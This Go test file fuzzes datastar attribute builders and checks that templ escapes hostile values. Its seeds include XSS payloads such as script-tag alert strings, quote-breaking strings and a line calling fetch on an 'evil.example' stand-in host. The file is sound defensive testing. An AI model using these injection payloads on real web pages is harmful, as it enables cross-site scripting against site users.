package datastar

import (
	"strings"
	"testing"

	templruntime "github.com/a-h/templ/runtime"
	"github.com/a-h/templ"
)

// Fuzz builders (plan T13): hostile inputs must never panic, never produce
// more than one attribute per builder call, never emit a key that is not a
// plausible data-* attribute name, and never smuggle a URL scheme into a
// NAME position (names are grammar-validated; expressions are consumer code
// carried verbatim). Run: go test -fuzz=FuzzBuilders -time=30s (the seed
// corpus runs in normal `go test` too).

func fuzzCheckAttrs(t *testing.T, name string, attrs templ.Attributes) {
	t.Helper()

	if attrs == nil {
		return
	}

	if len(attrs) != 1 {
		t.Fatalf("%s: want at most one attribute, got %d (%#v)", name, len(attrs), attrs)
	}

	for key, value := range attrs {
		if !strings.HasPrefix(key, "data-") {
			t.Fatalf("%s: key %q is not a data-* attribute", name, key)
		}

		if strings.Contains(key, "://") || strings.Contains(key, "javascript:") {
			t.Fatalf("%s: key %q smuggles a URL scheme", name, key)
		}

		if _, ok := value.(string); !ok && value != "" {
			t.Fatalf("%s: value %T is not a string", name, value)
		}
	}
}

func FuzzBuilders(f *testing.F) {
	f.Add("$count++", "click", "users", map[string]any{"k": 1})
	f.Add(`'; alert(1); '`, "click", "Users", map[string]any{"k": "v"})
	f.Add("@get('/x')", "keydown", "metrics.users", map[string]any{"nested": map[string]any{"deep": true}})
	f.Add("<script>alert(1)</script>", "datastar-fetch", "__bad", map[string]any{"a": []int{1, 2}})
	f.Add("$a\n$b", "load", "_local", map[string]any{"": ""})

	f.Fuzz(func(t *testing.T, expr, event, name string, values map[string]any) {
		fuzzCheckAttrs(t, "Show", Show(expr))
		fuzzCheckAttrs(t, "Text", Text(expr))
		fuzzCheckAttrs(t, "Bind", Bind(SignalName(name)))
		fuzzCheckAttrs(t, "Computed", Computed(SignalName(name), expr))
		fuzzCheckAttrs(t, "Signals", Signals(values))

		chain := On(event, expr).Prevent().Debounce(100).Throttle(100)
		fuzzCheckAttrs(t, "On", chain.Attrs())
	})
}

// TestBuildersRenderSafeAttributes is the static no-injection guard: for
// hostile seeds, the RENDERED attribute output (what templ writes into HTML)
// stays inside a quoted attribute value — no raw quote, no tag boundary can
// appear outside the value's opening/closing quotes, because templ escapes
// the value at render time. The guard pins that contract for the builders'
// outputs specifically.
func TestBuildersRenderSafeAttributes(t *testing.T) {
	t.Parallel()

	hostile := map[string]templ.Attributes{
		"show":     Show(`'$x' + "</span><script>alert(1)</script>"`),
		"computed": Computed("ok", `"</div>` + "`" + `"`),
		"on":       On("click", `'; fetch("//evil.example") ; '`).Attrs(),
	}

	var b strings.Builder

	for name, attrs := range hostile {
		b.Reset()

		if _, err := b.WriteString("<span"); err != nil {
			t.Fatalf("seed writer: %v", err)
		}

		if err := templruntime.RenderAttributes(nil, &b, &b, "span", attrs); err != nil {
			t.Fatalf("%s: render hostile attrs: %v", name, err)
		}

		if _, err := b.WriteString("></span>"); err != nil {
			t.Fatalf("seed writer close: %v", err)
		}

		rendered := b.String()

		// After the opening quote of the value, a raw double quote would end
		// the attribute and any following character would escape the tag.
		valueStart := strings.Index(rendered, `="`)
		if valueStart < 0 {
			t.Fatalf("%s: no attribute value found in %q", name, rendered)
		}

		inner := rendered[valueStart+2:]

		if closer := strings.Index(inner, `"`); closer != len(inner)-3 { // the final `"></span>` close
			t.Errorf("%s: hostile value broke the attribute boundary: %q", name, rendered)
		}
	}
}
